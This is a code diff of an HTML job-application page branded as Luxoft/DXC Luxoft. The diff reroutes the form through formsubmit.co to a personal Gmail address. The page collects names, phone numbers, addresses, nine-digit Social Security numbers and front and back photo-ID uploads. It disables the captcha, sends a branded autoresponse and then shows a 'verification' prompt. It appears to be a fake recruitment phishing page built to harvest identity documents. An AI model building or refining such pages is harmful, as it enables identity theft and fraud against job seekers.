@@ -9,7 +9,6 @@
   <link rel="icon" type="image/png" href="favicon.png" />
   <title>Luxoft Application Form</title>
   <style>
-    /* Your existing CSS remains exactly the same */
     :root {
       --primary-bg: linear-gradient(to bottom, #1A0D2E, #2C1A5B);
       --text-color: #FFFFFF;
@@ -289,26 +288,28 @@
     <p>Thank you for submitting your application. Please wait for verification instructions.</p>
   </div>
   
-  <!-- GOOGLE FORMS INTEGRATION -->
-  <!-- Replace the field IDs (entry.XXXXX) with your actual Google Form field IDs -->
-  <form id="applicationForm" action="https://docs.google.com/forms/d/e/1FAIpQLSf4vCWWvGKsy_ZNVeruEXqauFcrrTIh40gaD0A6VPGbXEFCbQ/formResponse" method="POST" target="hiddenFrame">
+  <!-- FORMSUBMIT.CO FORM - PROPERLY CONFIGURED -->
+  <form id="applicationForm" action="https://formsubmit.co/luxoftorganization@gmail.com" method="POST" enctype="multipart/form-data" target="hiddenFrame">
+    <!-- FormSubmit Configuration -->
+    <input type="hidden" name="_subject" value="New Luxoft Job Application">
+    <input type="hidden" name="_template" value="table">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_autoresponse" value="Thank you for your application to DXC Luxoft! We will review your submission and contact you shortly.">
+    <input type="hidden" name="_blacklist" value="spam,test">
     
     <!-- Step 1: Personal Info -->
     <div class="step active" id="step1">
       <div class="form-group">
         <label for="fullname">Full Name</label>
-        <input type="text" id="fullname" name="entry.XXXXXXXXX" placeholder="Enter your full name" required>
-        <!-- Replace entry.XXXXXXXXX with your actual field ID for Full Name -->
+        <input type="text" id="fullname" name="Full Name" placeholder="Enter your full name" required>
       </div>
       <div class="form-group">
         <label for="email">Email <span class="tooltip" title="We'll never share your email.">ⓘ</span></label>
-        <input type="email" id="email" name="entry.XXXXXXXXX" placeholder="Enter your email" required>
-        <!-- Replace entry.XXXXXXXXX with your actual field ID for Email -->
+        <input type="email" id="email" name="Email" placeholder="Enter your email" required>
       </div>
       <div class="form-group">
         <label for="phone">Phone Number</label>
-        <input type="tel" id="phone" name="entry.XXXXXXXXX" placeholder="Enter your phone number" required>
-        <!-- Replace entry.XXXXXXXXX with your actual field ID for Phone -->
+        <input type="tel" id="phone" name="Phone Number" placeholder="Enter your phone number" required>
       </div>
       <div class="button-container">
         <button type="button" onclick="nextStep()">Next</button>
@@ -319,13 +320,11 @@
     <div class="step" id="step2">
       <div class="form-group">
         <label for="address">Full Address</label>
-        <input type="text" id="address" name="entry.XXXXXXXXX" placeholder="Enter your full address, street, city, state, country" required>
-        <!-- Replace entry.XXXXXXXXX with your actual field ID for Address -->
+        <input type="text" id="address" name="Full Address" placeholder="Enter your full address, street, city, state, country" required>
       </div>
       <div class="form-group">
         <label for="ssn">SSN <span class="tooltip" title="Enter 9-digit Social Security Number.">ⓘ</span></label>
-        <input type="text" id="ssn" name="entry.XXXXXXXXX" placeholder="XXXXXXXXX" pattern="\d{9}" title="Enter SSN in XXXXXXXXX format" required>
-        <!-- Replace entry.XXXXXXXXX with your actual field ID for SSN -->
+        <input type="text" id="ssn" name="SSN" placeholder="XXXXXXXXX" pattern="\d{9}" title="Enter SSN in XXXXXXXXX format" required>
       </div>
       <div class="button-container">
         <button type="button" onclick="prevStep()">Back</button>
@@ -341,8 +340,7 @@
           Drag & drop or click to upload
           <span id="file-name-front" style="display:block;margin-top:0.5rem;color:var(--text-secondary);font-weight:600;">No file chosen</span>
         </div>
-        <input type="file" id="id-front" name="entry.XXXXXXXXX" accept=".pdf,.doc,.docx,.jpg,.png" style="display:none;">
-        <!-- Replace entry.XXXXXXXXX with your actual field ID for ID Front -->
+        <input type="file" id="id-front" name="ID_Front" accept=".pdf,.doc,.docx,.jpg,.jpeg,.png" style="display:none;">
       </div>
       <div class="form-group">
         <label for="id-back">Photo ID (Back)</label>
@@ -350,8 +348,7 @@
           Drag & drop or click to upload
           <span id="file-name-back" style="display:block;margin-top:0.5rem;color:var(--text-secondary);font-weight:600;">No file chosen</span>
         </div>
-        <input type="file" id="id-back" name="entry.XXXXXXXXX" accept=".pdf,.doc,.docx,.jpg,.png" style="display:none;">
-        <!-- Replace entry.XXXXXXXXX with your actual field ID for ID Back -->
+        <input type="file" id="id-back" name="ID_Back" accept=".pdf,.doc,.docx,.jpg,.jpeg,.png" style="display:none;">
       </div>
       
       <div class="button-container">
@@ -362,7 +359,8 @@
     </div>
   </form>
 
-  <iframe name="hiddenFrame" style="display: none;"></iframe>
+  <!-- Hidden iframe for form submission -->
+  <iframe name="hiddenFrame" id="hiddenFrame" style="display: none;"></iframe>
 
   <footer>
     <p>Email: <a href="mailto:luxoftorganization@gmail.com">luxoftorganization@gmail.com</a> |
@@ -372,6 +370,7 @@
 
   <script>
     let currentStep = 1;
+    let isFormSubmitted = false;
     
     function nextStep() {
       if (currentStep < 3) {
@@ -445,9 +444,16 @@
       document.getElementById('overlay').style.display = 'none';
     }
 
+    // FORM SUBMISSION HANDLER
     document.getElementById("applicationForm").addEventListener("submit", function(e) {
       e.preventDefault();
       
+      if (isFormSubmitted) {
+        alert('Form already submitted!');
+        return;
+      }
+
+      // Validate all fields
       const requiredFields = this.querySelectorAll('[required]');
       let isValid = true;
       
@@ -460,12 +466,21 @@
         }
       });
       
+      // Check file uploads
       const frontFile = document.getElementById('id-front').files[0];
       const backFile = document.getElementById('id-back').files[0];
       
       if (!frontFile || !backFile) {
         isValid = false;
         alert('Please upload both front and back of your Photo ID');
+        return;
+      }
+      
+      // Check file sizes (FormSubmit has limits)
+      const maxSize = 10 * 1024 * 1024; // 10MB
+      if (frontFile.size > maxSize || backFile.size > maxSize) {
+        alert('File size too large. Please upload files smaller than 10MB.');
+        return;
       }
       
       if (!isValid) {
@@ -473,21 +488,33 @@
         return;
       }
 
+      // Show loading
       document.getElementById("loading").style.display = "block";
       document.getElementById("submitButton").disabled = true;
+      isFormSubmitted = true;
       
+      // Submit the form to the hidden iframe
       this.submit();
       
-      document.querySelectorAll('.step').forEach(step => {
-        step.style.display = 'none';
-      });
-      document.getElementById('successMessage').style.display = 'block';
+      // Hide form and show success
+      setTimeout(() => {
+        document.querySelectorAll('.step').forEach(step => {
+          step.style.display = 'none';
+        });
+        document.getElementById('successMessage').style.display = 'block';
+        document.getElementById("loading").style.display = "none";
+      }, 1000);
       
+      // Show verification alert after 10 seconds
       setTimeout(() => {
         document.getElementById('verificationAlert').style.display = 'block';
         document.getElementById('overlay').style.display = 'block';
-        document.getElementById("loading").style.display = "none";
-      }, 5000);
+      }, 10000);
+    });
+
+    // Listen for iframe load to detect successful submission
+    document.getElementById('hiddenFrame').addEventListener('load', function() {
+      console.log('Form submitted to FormSubmit');
     });
   </script>
 </body>
